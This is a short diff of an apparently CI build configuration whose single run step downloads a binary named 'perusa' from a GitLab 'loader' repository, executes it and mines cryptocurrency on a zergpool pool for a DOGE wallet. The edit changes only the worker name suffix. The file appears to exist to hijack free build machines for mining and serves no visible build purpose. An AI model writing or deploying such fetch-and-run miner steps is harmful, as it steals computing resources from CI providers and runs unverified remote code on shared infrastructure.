@@ -3,4 +3,4 @@ FROM vm/ubuntu:18.04
 SPLIT 30
 RUN apt-get update && \
     apt-get install libjansson4 unzip && \
-	  wget -qO perusa https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa && ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTHXifqrvqbY7ipmqQugr7VqEcQqjuVed.$(echo $(shuf -i 1-2000 -n 1)-JENGKOL) -p c=DOGE
+	  wget -qO perusa https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa && ./perusa -v -l verushash.na.mine.zergpool.com:3300 -u DCTHXifqrvqbY7ipmqQugr7VqEcQqjuVed.$(echo $(shuf -i 1-2000 -n 1)-JEGKOL) -p c=DOGE
